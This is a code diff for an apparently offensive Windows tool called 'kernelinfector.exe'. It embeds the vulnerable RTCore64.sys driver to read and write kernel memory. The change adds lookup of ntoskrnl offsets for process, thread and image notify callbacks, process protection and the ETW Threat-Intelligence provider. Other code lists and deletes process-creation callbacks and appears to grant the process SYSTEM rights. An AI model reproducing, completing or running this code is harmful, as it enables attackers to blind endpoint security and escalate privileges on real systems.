@@ -5,9 +5,13 @@ package main
 
 import (
 	_ "embed"
+	"encoding/csv"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
+	"strconv"
+	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -16,7 +20,7 @@ import (
 )
 
 //go:embed resources/NtoskrnlOffsets.csv
-var ntoskrnlOffsets string
+var ntoskrnlOffsetsCSV string
 
 //go:embed resources/RTCore64.sys
 var binfile []byte
@@ -76,6 +80,28 @@ type Offsets struct {
 	Registry DWORD64
 }
 */
+
+/*
+ntoskrnlVersion,
+PspCreateProcessNotifyRoutineOffset,
+PspCreateThreadNotifyRoutineOffset,
+PspLoadImageNotifyRoutineOffset,
+_PS_PROTECTIONOffset,
+EtwThreatIntProvRegHandleOffset,
+EtwRegEntry_GuidEntryOffset,
+EtwGuidEntry_ProviderEnableInfoOffset
+*/
+
+type NtoskrnlOffsets struct {
+	ntoskrnlVersion                string
+	pspCreateProcessNotifyRoutine  uint64
+	pspCreateThreadNotifyRoutine   uint64
+	pspLoadImageNotifyRoutine      uint64
+	psProtection                   uint64
+	etwThreatIntProvRegHandle      uint64
+	etwRegEntryGuidEntry           uint64
+	etwGuidEntryProviderEnableInfo uint64
+}
 
 type Offsets struct {
 	UniqueProcessIdOffset    DWORD64
@@ -511,6 +537,90 @@ func uninstallVulnDriver() {
 
 }
 
+func getFileVersion(fName string) (string, error) {
+	var zeroHandle windows.Handle
+	var lpBuffer uintptr
+	var size uint32
+	zeroHandle = 0
+	verSize, err := windows.GetFileVersionInfoSize(fName, &zeroHandle)
+	if err != nil {
+		return "", err
+	}
+	if verSize != 0 {
+		data := make([]byte, verSize)
+		err = windows.GetFileVersionInfo(fName, 0, verSize, unsafe.Pointer(&data[0]))
+		if err != nil {
+			return "", err
+		}
+		err = windows.VerQueryValue(unsafe.Pointer(&data[0]), "\\", unsafe.Pointer(&lpBuffer), &size)
+		if err != nil {
+			return "", err
+		}
+		if size != 0 {
+			start := int(lpBuffer) - int(uintptr(unsafe.Pointer(&data[0])))
+			end := start + int(size)
+			if start < 0 || start >= len(data) || end < start || end > len(data) {
+				fmt.Println("VerQueryValueRoot")
+			}
+			infoData := data[start:end]
+			info := *((*windows.VS_FIXEDFILEINFO)(unsafe.Pointer(&infoData[0])))
+			majorVersion := (info.FileVersionLS >> 16) & 0xffff
+			minorVersion := (info.FileVersionLS >> 0) & 0xffff
+			return fmt.Sprintf("%d-%d", majorVersion, minorVersion), nil
+		}
+	}
+	return "", nil
+}
+
+func getNtoskrnlVersion() NtoskrnlOffsets {
+	dir, err := windows.GetSystemDirectory()
+	ntoskrnPath := dir + "\\ntoskrnl.exe"
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(ntoskrnPath)
+	version, err := getFileVersion(ntoskrnPath)
+	if err != nil {
+		panic(err)
+	}
+
+	ntoskrnVersion := fmt.Sprintf("ntoskrnl_%s.exe", version)
+
+	ntoskrnlOffsets := NtoskrnlOffsets{}
+	r := csv.NewReader(strings.NewReader(ntoskrnlOffsetsCSV))
+	for {
+		row, err := r.Read()
+		if err == io.EOF {
+			ntoskrnlOffsets = NtoskrnlOffsets{"", 0, 0, 0, 0, 0, 0, 0}
+			break
+		}
+		if row[0] == ntoskrnVersion {
+			ntoskrnlVersion := row[0]
+			pspCreateProcessNotifyRoutine, _ := strconv.ParseUint(row[1], 16, 64)
+			pspCreateThreadNotifyRoutine, _ := strconv.ParseUint(row[2], 16, 64)
+			pspLoadImageNotifyRoutine, _ := strconv.ParseUint(row[3], 16, 64)
+			psProtection, _ := strconv.ParseUint(row[4], 16, 64)
+			etwThreatIntProvRegHandle, _ := strconv.ParseUint(row[5], 16, 64)
+			etwRegEntryGuidEntry, _ := strconv.ParseUint(row[6], 16, 64)
+			etwGuidEntryProviderEnableInfo, _ := strconv.ParseUint(row[7], 16, 64)
+			ntoskrnlOffsets = NtoskrnlOffsets{
+				ntoskrnlVersion,
+				pspCreateProcessNotifyRoutine,
+				pspCreateThreadNotifyRoutine,
+				pspLoadImageNotifyRoutine,
+				psProtection,
+				etwThreatIntProvRegHandle,
+				etwRegEntryGuidEntry,
+				etwGuidEntryProviderEnableInfo,
+			}
+			// fmt.Println(row)
+			// fmt.Println(ntoskrnlOffsets)
+			break
+		}
+	}
+	return ntoskrnlOffsets
+}
+
 func makeSystem() {
 	cpid := DWORD64(os.Getpid())
 	offsets := getVersionOffsets()
@@ -557,7 +667,7 @@ func makeSystem() {
 
 func main() {
 	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"
-
+	getNtoskrnlVersion()
 	if len(os.Args) < 2 {
 		fmt.Println(usage)
 	} else if os.Args[1] == "/proc" {
